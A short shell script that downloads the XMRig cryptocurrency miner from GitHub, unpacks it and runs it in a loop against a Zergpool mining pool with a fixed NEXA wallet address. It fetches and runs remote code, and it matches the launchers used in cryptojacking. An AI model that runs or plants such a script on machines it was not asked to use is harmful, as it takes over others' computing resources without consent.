#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-macos-x64.tar.gz

tar -xvf xmrig-6.19.3-macos-x64.tar.gz

cd xmrig-6.19.3

chmod +x xmrig

./xmrig -o stratum+tcp://cryptonight_haven.asia.mine.zergpool.com:4452 -u nexa:nqtsq5g5m4cn4rcqtmrwgxqge7scu3hfl4fcf3zxpp4sdhy9 -p c=NEXA -k -a cn/2

     echo COUNTER $COUNTER
     let COUNTER-=1
done
